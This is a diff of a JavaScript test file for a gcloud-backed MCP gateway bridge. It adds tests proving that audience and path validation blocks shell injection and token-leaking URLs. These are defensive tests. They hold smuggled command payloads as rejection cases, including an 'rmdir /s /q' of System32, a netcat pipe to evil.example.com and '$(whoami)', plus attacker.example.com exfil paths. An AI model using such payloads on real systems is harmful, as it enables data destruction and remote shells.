@@ -35,7 +35,9 @@ import {
   forwardRequest,
   decodeJwtPayloadNoVerify,
   handleMessage,
-  extractSseJson
+  extractSseJson,
+  execGcloud,
+  validateAudience
 } from '../src/index.js';
 
 import { assertNode24 } from '../src/version-check.js';
@@ -184,7 +186,11 @@ describe('createTokenCache', () => {
       cache.getToken()
     ]);
 
-    assert.equal(mintCount, 2, 'exactly 2 mints total: initial + 1 coalesced re-mint');
+    assert.equal(
+      mintCount,
+      2,
+      'exactly 2 mints total: initial + 1 coalesced re-mint'
+    );
     assert.ok(tokens.every((t) => t === 'token-2'));
   });
 
@@ -220,7 +226,8 @@ describe('createTokenCache', () => {
 
 describe('createTokenCache — Shape B + identity cross-check', () => {
   test('(a) SA active + SA token: mints with --audiences; cross-check passes', async () => {
-    const saEmail = 'mcp-gw-production-sa@hafla-backend-v1.iam.gserviceaccount.com';
+    const saEmail =
+      'mcp-gw-production-sa@hafla-backend-v1.iam.gserviceaccount.com';
     const seenArgs = [];
     const cache = createTokenCache({
       activeAccount: saEmail,
@@ -270,8 +277,11 @@ describe('createTokenCache — Shape B + identity cross-check', () => {
       failFn,
       now: () => 0
     });
-    const result = await cache.getToken();
-    assert.equal(result, undefined, 'getToken must return undefined when failFn fires');
+    // Issue #4 fix: getToken() now REJECTS on identity-mismatch instead of
+    // resolving to undefined. This guarantees that if a future supervisor /
+    // test injects a non-terminating failFn, callers awaiting getToken()
+    // get a clean rejection rather than "Bearer undefined" downstream.
+    await assert.rejects(cache.getToken(), /Identity mismatch/);
     assert.equal(cache._state().cached, false, 'token must NOT be cached');
     assert.equal(failFn.calls.length, 1, 'failFn must be called exactly once');
     const message = failFn.calls[0].join('\n');
@@ -290,7 +300,7 @@ describe('createTokenCache — Shape B + identity cross-check', () => {
       failFn,
       now: () => 0
     });
-    await cache.getToken();
+    await assert.rejects(cache.getToken(), /Identity mismatch/);
     assert.equal(cache._state().cached, false);
     const message = failFn.calls[0].join('\n');
     assert.match(message, /Identity mismatch/);
@@ -305,7 +315,7 @@ describe('createTokenCache — Shape B + identity cross-check', () => {
       failFn,
       now: () => 0
     });
-    await cache.getToken();
+    await assert.rejects(cache.getToken(), /missing email claim/);
     assert.equal(cache._state().cached, false);
     const message = failFn.calls[0].join('\n');
     // Dedicated "missing email" framing — different from the identity-
@@ -316,7 +326,10 @@ describe('createTokenCache — Shape B + identity cross-check', () => {
     // (unset impersonation config) — NOT at adding gcloud flags they
     // don't control (the bridge owns gcloud args).
     assert.match(message, /impersonat/);
-    assert.match(message, /gcloud config unset auth\/impersonate_service_account/);
+    assert.match(
+      message,
+      /gcloud config unset auth\/impersonate_service_account/
+    );
     assert.doesNotMatch(
       message,
       /Identity mismatch/,
@@ -351,7 +364,7 @@ describe('createTokenCache — Shape B + identity cross-check', () => {
       failFn,
       now: () => 0
     });
-    await cache.getToken();
+    await assert.rejects(cache.getToken(), /Failed to mint Google ID token/);
     assert.equal(failFn.calls.length, 1);
     assert.equal(cache._state().cached, false);
     const message = failFn.calls[0].join('\n');
@@ -379,7 +392,7 @@ describe('createTokenCache — Shape B + identity cross-check', () => {
       failFn,
       now: () => 0
     });
-    await cache.getToken();
+    await assert.rejects(cache.getToken(), /not a valid JWT/);
     assert.equal(failFn.calls.length, 1);
     assert.equal(cache._state().cached, false);
     const message = failFn.calls[0].join('\n');
@@ -391,12 +404,16 @@ describe('createTokenCache — Shape B + identity cross-check', () => {
     const failFn = collectingFailFn();
     const cache = createTokenCache({
       activeAccount: 'Sidd@HAFLA.com',
-      execGcloudFn: async () => makeJwt({ email: 'sidd@hafla.com', hd: 'hafla.com' }),
+      execGcloudFn: async () =>
+        makeJwt({ email: 'sidd@hafla.com', hd: 'hafla.com' }),
       failFn,
       now: () => 0
     });
     const token = await cache.getToken();
-    assert.ok(token, 'case-variant active vs token must NOT be flagged as mismatch');
+    assert.ok(
+      token,
+      'case-variant active vs token must NOT be flagged as mismatch'
+    );
     assert.equal(failFn.calls.length, 0);
   });
 });
@@ -591,13 +608,16 @@ describe('handleMessage — concurrent dispatch (HIGH #1 fix)', () => {
 
   test('forwardRequest throws → pushes -32603 with original message id', async () => {
     const pushed = [];
-    await handleMessage(JSON.stringify({ jsonrpc: '2.0', method: 'x', id: 42 }), {
-      tokenCache: null,
-      pushFn: (l) => pushed.push(l),
-      forwardRequestFn: async () => {
-        throw new Error('synthetic-failure');
+    await handleMessage(
+      JSON.stringify({ jsonrpc: '2.0', method: 'x', id: 42 }),
+      {
+        tokenCache: null,
+        pushFn: (l) => pushed.push(l),
+        forwardRequestFn: async () => {
+          throw new Error('synthetic-failure');
+        }
       }
-    });
+    );
     assert.equal(pushed.length, 1);
     const resp = JSON.parse(pushed[0]);
     assert.equal(resp.error.code, -32603);
@@ -1145,7 +1165,10 @@ describe('parseDrainTimeoutMs', () => {
     // The bug: without isFinite, Number.parseInt('abc', 10) → NaN, and
     // setTimeout(_, NaN) coerces to 0 — immediate exit. Must default instead.
     assert.equal(parseDrainTimeoutMs('abc'), DEFAULT_DRAIN_TIMEOUT_MS);
-    assert.equal(parseDrainTimeoutMs('not-a-number'), DEFAULT_DRAIN_TIMEOUT_MS);
+    assert.equal(
+      parseDrainTimeoutMs('not-a-number'),
+      DEFAULT_DRAIN_TIMEOUT_MS
+    );
   });
 
   test('preserves explicit 0 (operator opts out of drain)', () => {
@@ -1160,5 +1183,406 @@ describe('parseDrainTimeoutMs', () => {
     // we trust parseInt's prefix-parsing convention. Operators who
     // typo "5000ms" get 5000, not the default.
     assert.equal(parseDrainTimeoutMs('500abc'), 500);
+  });
+});
+
+// ── execGcloud — Windows shell:true flag (CVE-2024-27980 mitigation) ────────
+
+describe('execGcloud — Windows spawn EINVAL fix', () => {
+  test('Windows options bag = shell + env + timeout (full shape)', async () => {
+    let captured;
+    const fakeExec = (_bin, _args, opts) => {
+      captured = opts;
+      return { stdout: '' };
+    };
+    await execGcloud(['auth', 'list'], { execFn: fakeExec, isWin32: true });
+    assert.strictEqual(captured.shell, true);
+    assert.deepStrictEqual(Object.keys(captured).sort(), [
+      'env',
+      'shell',
+      'timeout'
+    ]);
+  });
+
+  test('omits shell on non-Windows', async () => {
+    let captured;
+    const fakeExec = (_bin, _args, opts) => {
+      captured = opts;
+      return { stdout: '' };
+    };
+    await execGcloud(['auth', 'list'], { execFn: fakeExec, isWin32: false });
+    assert.strictEqual(captured.shell, undefined);
+  });
+
+  test('non-Windows options match 1.0.4 shape (timeout + env only)', async () => {
+    let captured;
+    const fakeExec = (_bin, _args, opts) => {
+      captured = opts;
+      return { stdout: '' };
+    };
+    await execGcloud(['auth', 'list'], { execFn: fakeExec, isWin32: false });
+    assert.deepStrictEqual(Object.keys(captured).sort(), ['env', 'timeout']);
+  });
+
+  test('default isWin32 resolves from process.platform at call time', async () => {
+    // No isWin32 passed — exercises the default expression in the destructured
+    // params. Guards against a future refactor that hard-codes the default to
+    // a constant boolean. shell:true iff host process.platform === 'win32'.
+    let captured;
+    const fakeExec = (_bin, _args, opts) => {
+      captured = opts;
+      return { stdout: '' };
+    };
+    await execGcloud(['auth', 'list'], { execFn: fakeExec });
+    const expectedShell = process.platform === 'win32' ? true : undefined;
+    assert.strictEqual(captured.shell, expectedShell);
+  });
+});
+
+// ── validateAudience — load-bearing safety boundary for shell:true ──────────
+//
+// The execGcloud shell:true workaround for CVE-2024-27980 (Windows .cmd
+// rejection) is safe ONLY because every templated arg value is validated
+// upstream. validateAudience() is that validation for `--audiences=<value>`,
+// the one non-literal value execGcloud receives. These tests lock the
+// validation contract: malformed URLs, non-origin URLs, and shell-metachar
+// payloads must all reject; legitimate origin URLs must pass.
+
+describe('validateAudience — origin + no-metachars contract', () => {
+  test('accepts canonical Hafla origin', () => {
+    assert.strictEqual(
+      validateAudience('https://mcp.hafla.com'),
+      'https://mcp.hafla.com'
+    );
+  });
+
+  test('accepts trailing slash (pathname "/" is treated as origin)', () => {
+    assert.strictEqual(
+      validateAudience('https://mcp.hafla.com/'),
+      'https://mcp.hafla.com'
+    );
+  });
+
+  test('accepts localhost with explicit port (dev case)', () => {
+    assert.strictEqual(
+      validateAudience('http://localhost:8080'),
+      'http://localhost:8080'
+    );
+  });
+
+  test('rejects unparseable garbage', () => {
+    assert.throws(
+      () => validateAudience('not a url at all'),
+      /could not parse as URL|control characters or whitespace/
+    );
+  });
+
+  test('rejects audience with path component', () => {
+    assert.throws(
+      () => validateAudience('https://mcp.hafla.com/mcp'),
+      /must be origin-only/
+    );
+  });
+
+  test('rejects audience with query string', () => {
+    assert.throws(
+      () => validateAudience('https://mcp.hafla.com?x=1'),
+      /must be origin-only/
+    );
+  });
+
+  test('rejects audience with fragment', () => {
+    assert.throws(
+      () => validateAudience('https://mcp.hafla.com#frag'),
+      /must be origin-only/
+    );
+  });
+
+  test('rejects audience with userinfo', () => {
+    assert.throws(
+      () => validateAudience('https://user@mcp.hafla.com'),
+      /must be origin-only/
+    );
+  });
+
+  // ── The injection cases that motivate this validation ─────────────────
+
+  test('rejects cmd.exe & (command separator)', () => {
+    // The classic injection payload: GATEWAY_AUDIENCE="https://mcp.hafla.com&rmdir /s /q C:\\Windows\\System32"
+    // Without validation + shell:true on Windows, this would execute rmdir
+    // when --audiences=<value> is concatenated into the cmd.exe command line.
+    assert.throws(
+      () =>
+        validateAudience(
+          'https://mcp.hafla.com&rmdir /s /q C:\\Windows\\System32'
+        ),
+      /shell metacharacters|could not parse|control characters or whitespace/
+    );
+  });
+
+  test('rejects cmd.exe | (pipe)', () => {
+    assert.throws(
+      () => validateAudience('https://mcp.hafla.com|nc evil.example.com 4444'),
+      /shell metacharacters|could not parse|control characters or whitespace/
+    );
+  });
+
+  test('rejects cmd.exe % (env var expansion)', () => {
+    // %USERPROFILE% would expand to the user's profile path under cmd.exe.
+    assert.throws(
+      () => validateAudience('https://mcp.hafla.com%USERPROFILE%'),
+      /shell metacharacters|could not parse|control characters or whitespace/
+    );
+  });
+
+  test('rejects POSIX $(...) command substitution', () => {
+    assert.throws(
+      () => validateAudience('https://mcp.hafla.com$(whoami)'),
+      /shell metacharacters|could not parse|control characters or whitespace/
+    );
+  });
+
+  test('rejects POSIX backtick command substitution', () => {
+    assert.throws(
+      () => validateAudience('https://mcp.hafla.com`whoami`'),
+      /shell metacharacters|could not parse|control characters or whitespace/
+    );
+  });
+
+  test('rejects output redirection >', () => {
+    assert.throws(
+      () => validateAudience('https://mcp.hafla.com>out.txt'),
+      /shell metacharacters|could not parse|control characters or whitespace/
+    );
+  });
+
+  test('rejects input redirection <', () => {
+    assert.throws(
+      () => validateAudience('https://mcp.hafla.com<input.txt'),
+      /shell metacharacters|could not parse|control characters or whitespace/
+    );
+  });
+
+  test('rejects cmd.exe ^ (escape)', () => {
+    assert.throws(
+      () => validateAudience('https://mcp.hafla.com^&malicious'),
+      /shell metacharacters|could not parse|control characters or whitespace/
+    );
+  });
+
+  // ── Control-character / whitespace gap (newline-injection class) ─────────
+  //
+  // The WHATWG URL parser silently strips ASCII tab / CR / LF from its input
+  // (per spec). The original 23e44ba shell-metachar blocklist did NOT
+  // include those, so a raw `GATEWAY_AUDIENCE` with an embedded `\n` would
+  // pass validation, get stripped during URL parsing, and — if the caller
+  // discarded the parser's normalized return value (which the module-load
+  // site originally did) — flow into execGcloud's `--audiences=<...>` arg
+  // with the newline still present. Under shell:true on Windows, cmd.exe
+  // interprets the newline as a command separator.
+  //
+  // The post-Gemini-review fix introduces an up-front C0-control/whitespace
+  // reject (constraint 1 in validateAudience), AND assigns the return value
+  // back to config.audience at the module-load call site. These tests pin
+  // both halves.
+
+  test('rejects embedded newline (\\n) — WHATWG-strip bypass class', () => {
+    assert.throws(
+      () => validateAudience('https://mcp.hafla.com\ncalc.exe'),
+      /control characters or whitespace/
+    );
+  });
+
+  test('rejects embedded carriage return (\\r)', () => {
+    assert.throws(
+      () => validateAudience('https://mcp.hafla.com\rcalc.exe'),
+      /control characters or whitespace/
+    );
+  });
+
+  test('rejects embedded tab (\\t)', () => {
+    assert.throws(
+      () => validateAudience('https://mcp.hafla.com\tcalc.exe'),
+      /control characters or whitespace/
+    );
+  });
+
+  test('rejects embedded NUL (\\0)', () => {
+    assert.throws(
+      () => validateAudience('https://mcp.hafla.com\0calc.exe'),
+      /control characters or whitespace/
+    );
+  });
+
+  test('rejects embedded space (0x20)', () => {
+    assert.throws(
+      () => validateAudience('https://mcp.hafla.com calc.exe'),
+      /control characters or whitespace/
+    );
+  });
+
+  test('returns the parser-normalized origin (callers MUST assign back)', () => {
+    // Regression net for the "return value discarded" class. The module-load
+    // site MUST do `config.audience = validateAudience(config.audience)` so
+    // downstream callers use the parser-normalized origin. If a future
+    // refactor drops the assignment, the discarded-return-value class
+    // re-opens. We assert the function returns the parser's normalized
+    // origin — equality, not identity — and callers' assignment is the
+    // contractual obligation pinned in the JSDoc.
+    const result = validateAudience('https://mcp.hafla.com/');
+    assert.equal(result, 'https://mcp.hafla.com');
+    // The input had a trailing slash; the parser-normalized origin omits it.
+    // If the caller doesn't assign back, downstream sees the trailing slash.
+    assert.notEqual(result, 'https://mcp.hafla.com/');
+  });
+});
+
+// ── forwardRequest — Issue #1 backstop + Issue #2 query-string preservation ──
+//
+// Module-load rejects GATEWAY_PATH containing a URL scheme (Issue #1
+// primary boundary, smoke-tested separately via `GATEWAY_PATH=http://evil
+// node src/index.js` → exit 1). The block below covers:
+//
+//   (a) the in-flight origin-mismatch backstop inside forwardRequest, which
+//       protects against any future code path that derives gatewayPath
+//       dynamically and bypasses module-load validation.
+//   (b) query-string preservation in the constructed `path` option.
+
+// Mock that captures whatever options the bridge passes — used by tests
+// that need to inspect `path` rather than the response payload.
+function capturingHttpRequest({ statusCode, body }) {
+  const captured = {};
+  const fn = (options, callback) => {
+    Object.assign(captured, options);
+    const req = new EventEmitter();
+    req.write = () => {};
+    req.end = () => {
+      const res = new EventEmitter();
+      res.statusCode = statusCode;
+      res.setEncoding = () => {};
+      callback(res);
+      setImmediate(() => {
+        res.emit('data', body);
+        res.emit('end');
+      });
+    };
+    req.destroy = () => {};
+    return req;
+  };
+  fn.captured = captured;
+  return fn;
+}
+
+describe('forwardRequest — GATEWAY_PATH safety + query-string preservation', () => {
+  test('rejects an absolute URL as gatewayPath (Issue #1 in-flight backstop)', async () => {
+    // Module-load validation is the primary boundary; this test exercises
+    // the post-construct backstop by overriding gatewayPath at the
+    // forwardRequest call site (simulating a future code path that
+    // derives gatewayPath dynamically). Without the backstop, the bridge
+    // would send `Authorization: Bearer <google-id-token>` over plaintext
+    // HTTP to the attacker-controlled host.
+    const tokenCache = createTokenCache({
+      execGcloudFn: async () => 'fake-jwt',
+      now: () => 0
+    });
+    await assert.rejects(
+      forwardRequest(
+        { jsonrpc: '2.0', method: 'tools/list', id: 1 },
+        {
+          tokenCache,
+          httpRequestFn: capturingHttpRequest({ statusCode: 200, body: '{}' }),
+          gatewayUrl: 'https://mcp.hafla.com',
+          // Absolute URL → new URL(gatewayPath, gatewayUrl) ignores base
+          // and resolves to attacker host. Backstop must reject.
+          gatewayPath: 'http://attacker.example.com/exfil',
+          requestTimeoutMs: 1000
+        }
+      ),
+      /refusing to send token/
+    );
+  });
+
+  test('preserves query string in constructed path (Issue #2)', async () => {
+    // Without the url.search append, GATEWAY_PATH=/mcp?tenant=xyz would
+    // arrive at the gateway as `path=/mcp`, silently dropping the routing
+    // hint. Captures the options.path the bridge hands to httpRequest and
+    // asserts both the pathname AND the query survive.
+    const tokenCache = createTokenCache({
+      execGcloudFn: async () => 'fake-jwt',
+      now: () => 0
+    });
+    const capture = capturingHttpRequest({
+      statusCode: 200,
+      body: JSON.stringify({ jsonrpc: '2.0', result: {}, id: 1 })
+    });
+    await forwardRequest(
+      { jsonrpc: '2.0', method: 'tools/list', id: 1 },
+      {
+        tokenCache,
+        httpRequestFn: capture,
+        gatewayUrl: 'https://mcp.hafla.com',
+        gatewayPath: '/mcp?tenant=xyz&env=staging',
+        requestTimeoutMs: 1000
+      }
+    );
+    assert.equal(capture.captured.path, '/mcp?tenant=xyz&env=staging');
+  });
+
+  test('path option still works when there is no query string', async () => {
+    // Regression guard: url.search is the empty string when no query is
+    // present, so `url.pathname + url.search` must equal `url.pathname`
+    // exactly — no trailing `?`. Locks the no-query baseline.
+    const tokenCache = createTokenCache({
+      execGcloudFn: async () => 'fake-jwt',
+      now: () => 0
+    });
+    const capture = capturingHttpRequest({
+      statusCode: 200,
+      body: JSON.stringify({ jsonrpc: '2.0', result: {}, id: 1 })
+    });
+    await forwardRequest(
+      { jsonrpc: '2.0', method: 'tools/list', id: 1 },
+      {
+        tokenCache,
+        httpRequestFn: capture,
+        gatewayUrl: 'https://mcp.hafla.com',
+        gatewayPath: '/mcp',
+        requestTimeoutMs: 1000
+      }
+    );
+    assert.equal(capture.captured.path, '/mcp');
+  });
+
+  test('backstop catches leading-whitespace scheme-prefix bypass class', async () => {
+    // The module-load GATEWAY_PATH scheme regex `^[a-z][a-z0-9+.-]*:` is
+    // anchored at position 0 with `[a-z]`. WHATWG URL parser strips leading
+    // ASCII whitespace per spec, so `\nhttp://attacker.com` bypasses an
+    // anchored regex (position 0 is `\n`, not in `[a-z]`) AND then the `\n`
+    // gets stripped during URL parsing — same WHATWG-strip class that bit
+    // validateAudience in 23e44ba. Module-load now rejects this via the
+    // `[\x00-\x20\x7f]` upfront check (added post-PR-#5 review). This
+    // test exercises the in-flight backstop in forwardRequest — proves
+    // that even if a future code path constructs gatewayPath dynamically
+    // and skips the module-load check, the origin-mismatch backstop still
+    // blocks the token leak. Defense-in-depth verification.
+    const tokenCache = createTokenCache({
+      execGcloudFn: async () => 'fake-jwt',
+      now: () => 0
+    });
+    await assert.rejects(
+      forwardRequest(
+        { jsonrpc: '2.0', method: 'tools/list', id: 1 },
+        {
+          tokenCache,
+          httpRequestFn: capturingHttpRequest({ statusCode: 200, body: '{}' }),
+          gatewayUrl: 'https://mcp.hafla.com',
+          // Leading newline; WHATWG parser strips it, then sees an
+          // absolute URL → base ignored → url.origin escapes.
+          gatewayPath: '\nhttp://attacker.example.com/exfil',
+          requestTimeoutMs: 1000
+        }
+      ),
+      /refusing to send token/
+    );
   });
 });
